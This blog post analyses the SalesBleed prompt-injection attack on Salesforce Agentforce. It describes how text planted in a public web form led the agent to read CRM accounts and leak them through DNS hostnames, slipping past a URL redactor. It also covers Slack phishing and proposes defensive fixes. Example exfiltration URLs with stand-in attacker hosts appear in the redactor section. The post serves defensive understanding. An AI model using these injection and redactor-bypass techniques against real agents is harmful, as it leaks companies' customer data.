---
layout: post
title: "Why does Agentforce take orders from a web form?"
subtitle: "To the model, a stranger's lead and the employee's question are one stream of text. The filter meant to stop the leak only blocked URLs it recognized."
description: >-
  Zenity's SalesBleed put a prompt injection in a public Salesforce Web-to-Lead
  form and leaked CRM data over DNS past Agentforce's URL redaction. Why form
  text gets read as instructions, why a redactor that has to recognize a URL
  before blocking it works like a blacklist, and what a deterministic egress
  control looks like.
date: 2026-10-01
permalink: /blog/why-does-agentforce-take-orders-from-a-web-form/
image: /assets/og/why-does-agentforce-take-orders-from-a-web-form.png
tags: [incident, prompt_injection, agentic, guardrails]
series: incidents
featured: true
short_title: "Why the web form gives orders"
exhibits: [/break-this-server/, /allowlist-bypass/, /you-are-the-model/]
corrections:
  - date: 2026-10-17
    kind: "Overstated"
    text: >-
      The first version said an attacker could adjust the payload until the
      redactor stopped catching it. Zenity saw the raw and redacted responses
      in an org of its own, and an outside attacker could not. The post now
      says that tuning happens in your own org before the finished lead is
      sent. The first version was live for about 17 minutes.
  - date: 2026-10-17
    kind: "Overstated"
    text: >-
      The first version introduced the ForcedLeak comparison as "what can be
      verified" and then called it "my inference". Only the same entry point
      and goal are established. The post now says SalesBleed bypassed a
      control with the same name as the ForcedLeak fix, and that nobody has
      said whether it is the same code. Live for about 17 minutes.
  - date: 2026-10-17
    kind: "Wrong attribution"
    text: >-
      The first version presented a third SalesBleed bug, agent-sent phishing
      messages in Slack, alongside Zenity's two, and said the agent sent them
      "under its own trusted identity". The bug is reported by SecurityWeek,
      not in Zenity's post. The post now credits SecurityWeek and drops the
      "trusted identity" wording. Live for about 17 minutes.
  - date: 2026-10-17
    kind: "Wrong detail"
    text: >-
      The first version said the expired ForcedLeak domain was still on
      "Salesforce's allowlist", in a section about the Trusted URLs list.
      That domain was on the chat's Content Security Policy `img-src`
      allowlist, and Trusted URLs Enforcement was the fix. The post now says
      so. Live for about 17 minutes.
  - date: 2026-10-18
    kind: "Wrong attribution"
    text: >-
      The post said the third SalesBleed bug, phishing messages sent by the
      agent in Slack, came from SecurityWeek and was not in Zenity's write-up,
      and the 2026-10-17 correction above repeated that. Zenity published it
      the same day in a second post, which says the agent posted the links
      "using the agent's own identity". The post now credits and links that
      Zenity post.
  - date: 2026-10-18
    kind: "Wrong detail"
    text: >-
      The timeline cited SecurityWeek saying all three bugs were fixed by
      August 19, 2026. Zenity's Slack post says the attribution fix was
      confirmed on August 20 and that all fixes, including user confirmation
      for Reply to a Slack Thread, were confirmed and tested on September 21.
      The timeline now follows Zenity's two posts.
  - date: 2026-10-18
    kind: "Wrong detail"
    text: >-
      The post said nobody had said whether the redactor SalesBleed beat was
      the fix that shipped after ForcedLeak, and that it couldn't find a CVE.
      Dark Reading reported on September 24, 2026 that Zenity worked around
      the URL filtering Salesforce added after ForcedLeak, that Salesforce
      called that earlier response a quick fix, and that the flaws have no
      CVE numbers. The post, facts box and diagram now say so.
facts:
  as_of: 2026-10-18
  sourced:
    - "Zenity Labs [published SalesBleed](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce) on September 24, 2026."
    - "The redactor \"only recognized a fixed set of top level domains as valid hosts,\" and `.fun` was not among them ([Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce))."
    - "The default General CRM subagent could already read Leads and Accounts ([Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce))."
    - "Zenity's timeline has Salesforce confirming fixes on August 18 and Zenity confirming the Trusted URLs fix on August 19."
    - "Zenity's [Slack post](https://labs.zenity.io/post/salesbleed-hijacking-agentforce-in-slack-for-anonymous-phishing) says all fixes, including user confirmation for Reply to a Slack Thread, were confirmed and tested on September 21, 2026."
    - "[Dark Reading](https://www.darkreading.com/application-security/salesbleed-exploits-salesforce-agents-slack-phishing) reports that SalesBleed worked around the URL filtering Salesforce added after ForcedLeak, that Salesforce called that earlier response a quick fix, and that the flaws have no CVE numbers."
    - "Salesforce says it has [no evidence of exploitation](https://www.securityweek.com/salesbleed-flaws-in-salesforce-agentforce-enabled-zero-click-data-exfiltration/) against any customer."
  inferred:
    - "In practice the redactor was a blacklist of URL shapes, because it only blocked strings it first recognized as URLs. My reading."
  unknown:
    - "The details of the new redaction logic."
    - "Which form field carried the payload."
---
On September 24, 2026, Zenity Labs published
[SalesBleed](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce),
a prompt injection against Salesforce Agentforce. The attacker fills in a
public Web-to-Lead form, the kind on a "Contact sales" page. Nobody logs in,
and nobody clicks anything. Some time later an employee asks the agent
something routine (Zenity's example is "check my latest leads and help me
with the newest one"). The agent reads the lead, follows the instructions
hidden in it, queries the Accounts table, and sends company names and deal
sizes to the attacker over DNS.

Why would a sales agent take orders from a stranger's form submission?

Because the model can't tell the stranger's text from the employee's, and the
filter that should have stopped the leak only blocked URLs it recognized as
URLs.

{% capture alt %}Numbered flowchart of SalesBleed. 1: a stranger submits a web form. 2: it becomes a lead in the CRM. 3: an employee later asks the agent about leads. The question, the system prompt and the stranger's lead text share one context window. 4: the model follows the injected text. 5: it reads Accounts. 6: it writes a link with the data in the hostname. 7: the URL redactor misses it. 8: the chat or Slack fetches it. 9: the DNS lookup carries the data. 10: it reaches the attacker's name server.{% endcapture %}
{% capture caption %}SalesBleed end to end. Solid steps are from Zenity's write-up. Dashed ones are undisclosed or my inference.{% endcapture %}
{% include figure.html src="/assets/blog/why-does-agentforce-take-orders-from-a-web-form/salesbleed-path.svg" alt=alt caption=caption %}

## The context window

The agent gets a context window. The vendor's system prompt goes in, then the
employee's question, then the result of the Query Records tool, which includes
the lead's fields as the stranger typed them. The model then predicts the next
tokens.

Now, you might say, "The system prompt is marked as the system and the lead is
marked as tool output. The model knows which is which." Not in any way a
security property can rest on. Role markers and delimiters are more tokens in
the same sequence. The model learned in training that text which sounds like
an instruction is usually followed by text that carries it out. The lead
description sounds like an instruction because the attacker wrote it to.

Picture a mailroom clerk who does whatever any sheet of paper in the inbox
says, including the sheets inside envelopes addressed to other people. The
clerk is very diligent. That is the problem.

{% capture alt %}Two sailors in a wood-paneled mail room around 1918, one reading letters at a slanted desk, the other at a wall of pigeonhole sorting boxes{% endcapture %}
{% capture caption %}Two clerks, a wall of pigeonholes, and nobody checking whose envelope it was. [Mail room at the Naval Training Station, Seattle, circa 1918](https://commons.wikimedia.org/wiki/File:Mail_room_at_the_Naval_Training_Station,_Seattle,_circa_1918_%28MOHAI_9102%29.jpg) by Webster & Stevens, MOHAI, [public domain](https://commons.wikimedia.org/wiki/Template:PD-US-expired).{% endcapture %}
{% include figure.html src="/assets/blog/why-does-agentforce-take-orders-from-a-web-form/navy-mail-room-1918.jpg" alt=alt caption=caption %}

As usual, look at who the attacker is, who the victim is, and what the
attacker gained. The attacker is anyone who can fill in a public form, with
no account. The victim is the company whose CRM it is. The gain is company
names and deal sizes from the Accounts table, which the attacker had no way
to read before. That hatchway really was crossed.

Nor did the attacker need extra privileges. Zenity says
the default General CRM subagent's Query Records tool could already read
Leads and Accounts: "The injection didn't need to escalate privileges, the
permissions were already there." The employee asked about one lead, and the
agent could read every account.

Related: [/you-are-the-model/](/you-are-the-model/) puts you in the model's
seat, and [/break-this-server/](/break-this-server/) is nearly the same
scenario with a support ticket in place of a sales lead.

## The redactor

Salesforce had a control for exactly this exfiltration step. Agentforce
redacts URLs in agent output unless they are on a Trusted URLs list. A string
like `https://attacker.example/?d=AcmeCorp` should come out redacted, and the
data stays home.

So how did the data leave? Zenity found that the redactor "only recognized a
fixed set of top level domains as valid hosts," and `.fun` was not among
them. It also found that curly braces and square brackets weren't redacted,
yet the chat surface still treated them as part of a clickable URL. In
Zenity's words, "the redactor and the surface rendering the response didn't
agree on where a valid URL ends."

The redaction ran after the agent produced its output, and Zenity saw both the
raw and the redacted versions in the response sent to the browser. In an org
of your own, you can compare the two and tune the payload until nothing gets
caught. Then you send the finished lead to the target.

The chat surface loaded the result as an image, with no click. For agents
published to Slack, Slack's link preview fetched it. Either way, something
resolved a hostname like `Acme-712412.<attacker-subdomain>.oast.fun`, and the
data was in the hostname. Zenity's point is that "the HTTP request that
follows is essentially irrelevant." The DNS query has already carried the
payload to the attacker's name server, so an HTTP egress block arrives too
late.

The Trusted URLs list is an allowlist, but the redactor applies it only to
strings it first recognizes as URLs. Anything the recognizer misses goes
through by default. My reading is that in practice the rule was "block things
that look like untrusted URLs," which is a blacklist of shapes. `.fun` and `}`
were shapes nobody listed.

The brace-and-bracket problem is the old version of this bug. One component
checks a string under one interpretation, and a different component acts on
it under another. The [wildcard that spans a slash](/allowlist-bypass/) is the
same mistake in a path allowlist, where the glob and the HTTP router disagree
about what `*` covers. I wrote up the fix for that one in
[guardrails belong in the server](/blog/guardrails-belong-in-the-server/).

Okay, so wasn't this fixed last year? In September 2025, Noma Security
disclosed
[ForcedLeak](https://noma.security/blog/forcedleak-agent-risks-exposed-in-salesforce-agentforce/).
A Web-to-Lead Description field carried an injection, and an image tag
pointed at `my-salesforce-cms.com`, a domain still on the chat's Content
Security Policy `img-src` allowlist after it had expired. Noma bought it for
$5. Noma reports that Salesforce re-secured the domain and rolled out Trusted
URLs Enforcement for Agentforce on September 8, 2025, and
[The Register](https://www.theregister.com/2025/09/26/salesforce_agentforce_forceleak_attack/)
reported the same date.

So SalesBleed has the same entry point and the same goal, and it bypassed a
control with the same name as the ForcedLeak fix. Neither Zenity post
mentions ForcedLeak, but
[Dark Reading](https://www.darkreading.com/application-security/salesbleed-exploits-salesforce-agents-slack-phishing)
reports that Zenity worked around the URL filtering rules Salesforce added in
response to ForcedLeak, and that Salesforce acknowledged its earlier response
was a quick fix rather than a comprehensive one. Salesforce hasn't said so in
an advisory of its own.

## Timeline

Zenity's timelines, from its two SalesBleed posts:

| Date | Event | Source |
|------|-------|--------|
| Jun 1, 2026 | Zenity reports the issues to Salesforce. | [Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce) |
| Aug 18, 2026 | Salesforce confirms the fixes. | [Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce) |
| Aug 19, 2026 | Zenity confirms the Trusted URLs fix. | [Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce) |
| Aug 20, 2026 | Zenity confirms Reply to a Slack Thread now names the user who invoked it. | [Zenity](https://labs.zenity.io/post/salesbleed-hijacking-agentforce-in-slack-for-anonymous-phishing) |
| Sep 21, 2026 | All fixes, including user confirmation for Reply to a Slack Thread, are confirmed and tested. | [Zenity](https://labs.zenity.io/post/salesbleed-hijacking-agentforce-in-slack-for-anonymous-phishing) |
| Sep 24, 2026 | Zenity publishes both SalesBleed posts. | [Zenity](https://labs.zenity.io/post/salesbleed-0-click-data-exfiltration-on-agentforce), [Zenity](https://labs.zenity.io/post/salesbleed-hijacking-agentforce-in-slack-for-anonymous-phishing) |
{: .timeline-table}

Zenity says Salesforce hardened "the Trusted URLs mechanism to prevent similar
attacks." Salesforce told
[SecurityWeek](https://www.securityweek.com/salesbleed-flaws-in-salesforce-agentforce-enabled-zero-click-data-exfiltration/)
it had "no evidence at this time that the reported issue was exploited
against any customer." It also said it had changed the defaults for certain
Agentforce actions in Slack to require user confirmation. That change fixes
the third bug, which Zenity covers in a
[second post](https://labs.zenity.io/post/salesbleed-hijacking-agentforce-in-slack-for-anonymous-phishing):
the Reply to a Slack Thread action in the default Slack Knowledge subagent
asked for no confirmation and didn't name the user who triggered it, so a
poisoned lead could make the agent post phishing links into Slack under the
agent's own identity.

Dark Reading reports that the flaws have no CVE numbers, and nobody has
published the details of the new redaction logic. Zenity doesn't name the
form field that carried the payload.

## Fixes

The fixes that hold list what is allowed and refuse everything else, at the
component that does the thing.

Start with egress, where the fetch happens. The chat surface
should load images only from origins on a short list, enforced by the
browser's `img-src` policy, and should render agent output as text unless
there's a reason to do otherwise. A Slack bot can post with `unfurl_links` and
`unfurl_media` turned off. When the component that makes the request also
enforces the allowlist, the redactor's parse stops mattering. ForcedLeak got
past exactly this kind of list, so the list needs the same upkeep as a domain
renewal. Links are the leftover case. Render agent output as plain text, or
send clicks through a server that checks the host against the list, so one
click doesn't leak the data either.

Then the tool boundary. The agent has to read the lead to summarize it, so the
lead text will be in its context. What you can control is what that context
can reach. The subagent that reads leads should not hold a tool that reads
Accounts. If one task needs both, have a model with no tools read the lead and
pass only a fixed-format summary to the model that has them. A stricter
design, which I'd use in my own MCP servers: once a session has read a field
an outside party wrote, the server drops the session's ability to emit links
or call write tools. The model in that session can still be fooled into
asking for a link, and the server refuses.

The [OWASP Agentic Top 10](/owasp-top-10/) and the
[tool poisoning](/tool-poisoning/) exhibit have more of the same pattern.

**Postscript:** The attacker's lead stays in the Leads table after it does
its work, and Zenity notes that it can run again every time an employee looks
at it. The patch doesn't remove it. After patching, search Leads created
through Web-to-Lead for text that looks like instructions or URLs.

**Exercise:** Suppose the redactor had been rewritten to recognize every TLD
and every terminating character the renderer accepts. Name one way the
renderer and the redactor could still disagree, and where you'd move the check
so the disagreement stops mattering.

{% capture answer %}
There are plenty. The renderer might decode something after the redactor has looked: HTML entities, percent-encoding, or an internationalized hostname that only turns into `.fun` once it's normalized. Or it might link things the redactor doesn't treat as URLs at all, such as a bare `example.fun` with no scheme, a Markdown reference link whose target is defined further down, or an `<img>` tag the chat surface renders as HTML. Close all of those, and the next renderer update that accepts a new syntax reopens the gap unless someone updates the redactor too.

So move the check to where the request happens. For Slack, turn off unfurling, or send it through a proxy that checks the final host. In the chat, use a Content Security Policy `img-src` allowlist. The browser enforces it on the URL it is about to fetch, after every decoding step has already run.
{% endcapture %}
{% include answer.html body=answer %}
